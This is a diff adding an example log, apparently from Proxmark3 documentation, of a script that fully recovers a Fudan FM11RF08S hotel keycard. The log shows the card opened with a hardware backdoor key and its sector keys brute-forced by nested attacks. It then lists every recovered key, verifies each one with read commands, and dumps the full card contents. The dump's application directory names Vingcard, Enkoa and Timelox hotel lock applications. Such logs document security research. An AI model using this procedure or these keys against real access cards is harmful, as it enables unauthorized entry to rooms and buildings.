@@ -1,0 +1,432 @@
+==================================================
+ EXAMPLE : Hotel keycard + MAD; incl key cracking
+==================================================
+
+[usb] pm3 --> script run fm11rf08_full.py --force
+[+] executing python /home/prox/proxmark3/client/pyscripts/fm11rf08_full.py
+[+] args '--force'
+[bc] Fudan FM11RF08[S] full card recovery
+[bc] (C)Copyright BlueChip 2024
+[bc] Licence: MIT ("Free as in free.")
+[bc]
+[bc] Dump folder: /home/prox/
+[bc]
+[bc] Trying known backdoor keys...
+[bc] `hf mf rdbl -c 4 --key A396EFA4E24F --blk 0` - success
+[bc]
+[bc]              UID         BCC         ++----- RF08 ID -----++
+[bc]              !           !  SAK      !!                   !!
+[bc]              !           !  !  ATQA  !!     RF08 Hash     !!
+[bc]              !---------. !. !. !---. VV .---------------. VV
+[bc]   Block 0  : 1C AD 0C 7A C7 08 04 00 04 35 3C 9D FA BC 39 90
+[bc]
+[bc]   UID/BCC  : 1CAD0C7A/C7 - verified
+[bc]   SAK      : 08 - NXP MIFARE CLASSIC 1k | Plus 1k | Ev1 1K
+[bc]   ATQA     : 0400
+[bc]   Fudan ID : [04:90] - Fudan FM11RF08S
+[bc]   Fudan Sig: 35 3C 9D FA BC 39
+[bc]   Dark Key : A396EFA4E24F
+[bc]
+[bc] Running recovery script, ETA: Less than 30 minutes
+[bc]
+[bc] `-._,-'"`-._,-"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,
+UID: 1CAD0C7A
+Getting nonces...
+Generating first dump file
+Data has been dumped to `/home/prox/hf-mf-1CAD0C7A-dump.bin`
+----Step 1:  0 minutes  2 seconds -----------
+Loading mfc_default_keys.dic
+Running staticnested_1nt & 2x1nt when doable...
+Looking for common keys across sectors...
+Saving duplicates dicts...
+Computing needed time for attack...
+----Step 2:  0 minutes 17 seconds -----------
+Still about  1 minutes 25 seconds to run...
+Brute-forcing keys... Press any key to interrupt
+Sector  0 keyA = a0a1a2a3a4a5
+Sector  0 keyB = b578f38a5c61
+Sector  1 keyB = e015cee2380a
+Sector  1 keyA = 8c0c5d149c0c
+Sector  2 keyA = a0a1a2a3a4a5
+Sector  2 keyB = 0000014b5c31
+Sector  3 keyA = ffffffffffff
+Sector  3 keyB = ffffffffffff
+Sector  4 keyA = ffffffffffff
+Sector  4 keyB = ffffffffffff
+Sector  5 keyA = ffffffffffff
+Sector  5 keyB = ffffffffffff
+Sector  6 keyA = ffffffffffff
+Sector  6 keyB = 96a301bce267
+Sector  7 keyA = ffffffffffff
+Sector  7 keyB = ffffffffffff
+Sector  8 keyA = ffffffffffff
+Sector  8 keyB = ffffffffffff
+Sector  9 keyA = ffffffffffff
+Sector  9 keyB = ffffffffffff
+Sector 10 keyA = ffffffffffff
+Sector 10 keyB = ffffffffffff
+Sector 11 keyA = ffffffffffff
+Sector 11 keyB = ffffffffffff
+Sector 12 keyA = ffffffffffff
+Sector 12 keyB = ffffffffffff
+Sector 13 keyA = ffffffffffff
+Sector 13 keyB = ffffffffffff
+Sector 14 keyA = ffffffffffff
+Sector 14 keyB = ffffffffffff
+Sector 15 keyA = ffffffffffff
+Sector 15 keyB = ffffffffffff
+Sector 32 keyB = 00001feef30e
+Sector 32 keyA = 2acc3da8e7db
+
+[+] found keys:
+
+[+] -----+-----+--------------+---+--------------+----
+[+]  Sec | Blk | key A        |res| key B        |res
+[+] -----+-----+--------------+---+--------------+----
+[+]  000 | 003 | a0a1a2a3a4a5 | 1 | b578f38a5c61 | 1
+[+]  001 | 007 | 8c0c5d149c0c | 1 | e015cee2380a | 1
+[+]  002 | 011 | a0a1a2a3a4a5 | 1 | 0000014b5c31 | 1
+[+]  003 | 015 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  004 | 019 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  005 | 023 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  006 | 027 | ffffffffffff | 1 | 96a301bce267 | 1
+[+]  007 | 031 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  008 | 035 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  009 | 039 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  010 | 043 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  011 | 047 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  012 | 051 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  013 | 055 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  014 | 059 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  015 | 063 | ffffffffffff | 1 | ffffffffffff | 1
+[+]  032 | 131 | 2acc3da8e7db | 1 | 00001feef30e | 1
+[+] -----+-----+--------------+---+--------------+----
+[+] ( 0:Failed / 1:Success )
+
+[+] Generating binary key file
+[+] Found keys have been dumped to `/home/prox/hf-mf-1CAD0C7A-key.bin`
+[+] Generating final dump file
+[+] Data has been dumped to `/home/prox/hf-mf-1CAD0C7A-dump.bin`
+[+] Removing generated dictionaries...
+----Step 3:  2 minutes 13 seconds -----------
+---- TOTAL:  2 minutes 33 seconds -----------
+[bc] `-._,-'"`-._,-"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,
+[bc]
+[bc] Load Keys from file: |/home/prox/hf-mf-1CAD0C7A-key.bin|
+[bc] Check keys..
+[bc]   `hf mf rdbl -c 0 --key a0a1a2a3a4a5 --blk 3`   ... PASS - MAD Key
+[bc]   `hf mf rdbl -c 1 --key b578f38a5c61 --blk 3`   ... PASS
+[bc]   `hf mf rdbl -c 0 --key 8c0c5d149c0c --blk 7`   ... PASS
+[bc]   `hf mf rdbl -c 1 --key e015cee2380a --blk 7`   ... PASS
+[bc]   `hf mf rdbl -c 0 --key a0a1a2a3a4a5 --blk 11`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key 0000014b5c31 --blk 11`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 15`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 15`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 19`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 19`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 23`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 23`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 27`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key 96a301bce267 --blk 27`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 31`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 31`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 35`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 35`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 39`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 39`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 43`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 43`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 47`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 47`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 51`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 51`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 55`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 55`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 59`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 59`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key ffffffffffff --blk 63`  ... PASS
+[bc]   `hf mf rdbl -c 1 --key ffffffffffff --blk 63`  ... PASS
+[bc]   `hf mf rdbl -c 0 --key 2acc3da8e7db --blk 131` ... PASS
+[bc]   `hf mf rdbl -c 1 --key 00001feef30e --blk 131` ... PASS
+[bc] All keys verified OK
+[bc] MAD key detected
+[bc]
+[bc] Load blocks {0..63, 128..135}[64+8=72] from the card
+[bc] `hf mf rdbl -c 4 --key A396EFA4E24F --blk 135` .. OK
+[bc]
+[bc] Patch keys in to data
+[bc]
+[bc] Dump Card Data to file: /home/prox/hf-mf-1CAD0C7A-dump18.bin
+[bc]
+[bc] ===========
+[bc]  Card Data
+[bc] ===========
+[bc]
+[bc]  0:  0 | 1C AD 0C 7A C7 08 04 00 04 35 3C 9D FA BC 39 90 | ...z.....5<...9.
+[bc]   :  1 | D5 01 06 70 05 70 07 70 07 70 07 70 09 70 00 00 | ...p.p.p.p.p.p..
+[bc]   :  2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   :  3 | a0 a1 a2 a3 a4 a5 78 77 88 C1 b5 78 f3 8a 5c 61
+[bc]
+[bc]  1:  4 | 06 0A 00 21 00 00 00 00 00 00 72 E2 93 4E 6A F0 | ...!......r..Nj.
+[bc]   :  5 | B1 F3 65 EB F3 72 FA 74 8B D2 F3 72 8D D2 72 7B | ..e..r.t...r..r{
+[bc]   :  6 | 72 72 72 72 72 72 72 72 72 72 F0 00 26 59 46 58 | rrrrrrrrrr..&YFX
+[bc]   :  7 | 8c 0c 5d 14 9c 0c 70 FF 08 69 e0 15 ce e2 38 0a
+[bc]
+[bc]  2:  8 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   :  9 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 10 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 11 | a0 a1 a2 a3 a4 a5 0F 00 FF AA 00 00 01 4b 5c 31
+[bc]
+[bc]  3: 12 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 13 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 14 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 15 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc]  4: 16 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 17 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 18 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 19 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc]  5: 20 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 21 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 22 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 23 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc]  6: 24 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 25 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 26 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 27 | ff ff ff ff ff ff 0F 00 FF 00 96 a3 01 bc e2 67
+[bc]
+[bc]  7: 28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 29 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 30 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 31 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc]  8: 32 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 33 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 34 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 35 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc]  9: 36 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 37 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 38 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 39 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc] 10: 40 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 41 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 42 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 43 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc] 11: 44 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 45 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 46 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 47 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc] 12: 48 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 49 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 50 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 51 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc] 13: 52 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 53 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 54 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 55 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc] 14: 56 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 57 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 58 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 59 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc] 15: 60 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 61 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 62 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   : 63 | ff ff ff ff ff ff FF 07 80 69 ff ff ff ff ff ff
+[bc]
+[bc] 32:128 | A5 5A 3C C3 3C F0 00 00 00 00 00 00 00 04 08 88 | .Z<.<...........
+[bc]   :129 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   :130 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   :131 | 2a cc 3d a8 e7 db 00 F0 FF 0F 00 00 1f ee f3 0e
+[bc]
+[bc] 33:132 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   :133 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   :134 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]   :135 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[bc]
+[bc] =====================
+[bc]  Access Control List
+[bc] =====================
+[bc]    _______________________________________________________
+[bc]   |        |                Sector Trailers               |
+[bc]   |        |----------------------------------------------|
+[bc]   | Sector |____Key_A_____||_Access_Bits__||____Key_B_____|
+[bc]   |        | read ¦ write || read ¦ write || read ¦ write |
+[bc]   |--------+------¦-------++------¦-------++------¦-------|
+[bc]   |    0   |  --  ¦ KeyB  || A+B  ¦ KeyB  ||  --  ¦ KeyB  | [011]  {78 77 88} -> {788}
+[bc]   |    1   |  --  ¦  --   || A+B  ¦  --   ||  --  ¦  --   | [110]  {70 FF 08} -> {F80}
+[bc]   |    2   |  --  ¦ KeyB  || A+B  ¦ KeyB  ||  --  ¦ KeyB  | [011]  {0F 00 FF} -> {0FF}
+[bc]   |    3   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |        |      ¦       ||      ¦       ||      ¦       |
+[bc]   |    4   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |    5   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |    6   |  --  ¦ KeyB  || A+B  ¦ KeyB  ||  --  ¦ KeyB  | [011]  {0F 00 FF} -> {0FF}
+[bc]   |    7   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |        |      ¦       ||      ¦       ||      ¦       |
+[bc]   |    8   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |    9   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |   10   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |   11   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |        |      ¦       ||      ¦       ||      ¦       |
+[bc]   |   12   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |   13   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |   14   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |   15   |  --  ¦ KeyA  || KeyA ¦ KeyA  || KeyA ¦ KeyA  | [001]  {FF 07 80} -> {008}
+[bc]   |        |      ¦       ||      ¦       ||      ¦       |
+[bc]   |   32   |  --  ¦  --   || A+B  ¦  --   ||  --  ¦  --   | [111]  {00 F0 FF} -> {FFF}
+[bc]   |   33   |  --  ¦ KeyA  || KeyA ¦  --   || KeyA ¦ KeyA  | [000]  {00 00 00} -> {000}
+[bc]
+[bc]    _____________________________________
+[bc]   |       |          Data Blocks        |
+[bc]   |       |-----------------------------|
+[bc]   | Block |    Data      ||   Counter   |
+[bc]   |       | read ¦ write || Inc  ¦ Dec  |
+[bc]   |-------+------¦-------++------¦------+
+[bc]   |    0  | A+B  ¦  KeyB ||  --  ¦  --  | [100]
+[bc]   |    1  | A+B  ¦  KeyB ||  --  ¦  --  | [100]
+[bc]   |    2  | A+B  ¦  KeyB ||  --  ¦  --  | [100]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |    4  | A+B  ¦  KeyB ||  --  ¦  --  | [100]
+[bc]   |    5  | A+B  ¦  KeyB ||  --  ¦  --  | [100]
+[bc]   |    6  | A+B  ¦  KeyB ||  --  ¦  --  | [100]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |    8  | KeyB ¦  KeyB ||  --  ¦  --  | [011]
+[bc]   |    9  | KeyB ¦  KeyB ||  --  ¦  --  | [011]
+[bc]   |   10  | KeyB ¦  KeyB ||  --  ¦  --  | [011]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   12  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   13  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   14  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   16  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   17  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   18  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   20  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   21  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   22  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   24  | KeyB ¦  KeyB ||  --  ¦  --  | [011]
+[bc]   |   25  | KeyB ¦  KeyB ||  --  ¦  --  | [011]
+[bc]   |   26  | KeyB ¦  KeyB ||  --  ¦  --  | [011]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   28  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   29  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   30  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   32  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   33  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   34  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   36  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   37  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   38  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   40  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   41  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   42  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   44  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   45  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   46  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   48  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   49  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   50  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   52  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   53  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   54  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   56  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   57  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   58  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |   60  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   61  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |   62  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |  128  | --   ¦  --   ||  --  ¦  --  | [111]
+[bc]   |  129  | --   ¦  --   ||  --  ¦  --  | [111]
+[bc]   |  130  | --   ¦  --   ||  --  ¦  --  | [111]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]   |  132  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |  133  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |  134  | A+B  ¦  A+B  || A+B  ¦  A+B | [000]
+[bc]   |       |      ¦       ||      ¦      |
+[bc]
+[bc] ====================================
+[bc]  MiFare Application Directory (MAD)
+[bc] ====================================
+[bc]
+[bc] `hf mf mad --verbose --file /home/prox/hf-mf-1CAD0C7A-dump18.bin`
+[bc]
+[bc] `-._,-'"`-._,-"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,
+
+[+] Loaded 1152 bytes from binary file `/home/prox/hf-mf-1CAD0C7A-dump18.bin`
+[=] File size 1152 bytes, file blocks 64 (0x40)
+
+[=] --- MIFARE App Directory Information ----------------
+[=] -----------------------------------------------------
+[+] Loaded file `/home/prox/proxmark3/client/resources/mad.json` (ok) 1953 records.
+
+[=] ------------ MAD v1 details -------------
+[+] GPB....... 0xC1
+[+] Version... 1
+[+] CRC8...... 0xD5 ( ok )
+[+] Multi application card
+[+] Card publisher sector 0x01
+
+[=] ---------------- Listing ----------------
+[=]  00 MAD v1
+[=]  01 [7006] Hotel, access contr. & sec [Vingcard a.s.]
+[+]     MAD:               0x7006
+[+]     Application:       Hotel, access contr. & sec
+[+]     Company:           Vingcard a.s.
+[+]     Service provider:  Vingcard
+[+]     System integrator: Vingcard
+[=]  02 [7005] Energy Saving System For Hotels, Access Control [ENKOA System]
+[+]     MAD:               0x7005
+[+]     Application:       Energy Saving System For Hotels, Access Control
+[+]     Company:           ENKOA System
+[+]     Service provider:  Enkoa System S.L.
+[+]     System integrator: Enkoa System S.L.
+[=]  03 [7007] Hotel, access contr. & sec [Vingcard a.s.]
+[+]     MAD:               0x7007
+[+]     Application:       Hotel, access contr. & sec
+[+]     Company:           Vingcard a.s.
+[+]     Service provider:  Vingcard
+[+]     System integrator: Vingcard
+[=]  04 [7007] continuation
+[=]  05 [7007] continuation
+[=]  06 [7009] Access control data for electronic locks [Timelox AB]
+[+]     MAD:               0x7009
+[+]     Application:       Access control data for electronic locks
+[+]     Company:           Timelox AB
+[+]     Service provider:  Timelox AB
+[+]     System integrator: Timelox AB
+[=]  07 [0000] free
+[=]  08 [0000] free
+[=]  09 [0000] free
+[=]  10 [0000] free
+[=]  11 [0000] free
+[=]  12 [0000] free
+[=]  13 [0000] free
+[=]  14 [0000] free
+[=]  15 [0000] free
+
+[bc] `-._,-'"`-._,-"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,-'"`-._,
+[bc]
+[bc] Bambu date strings not detected.
+[bc]
+[bc] Tadah!
+
+[+] finished fm11rf08_full.py
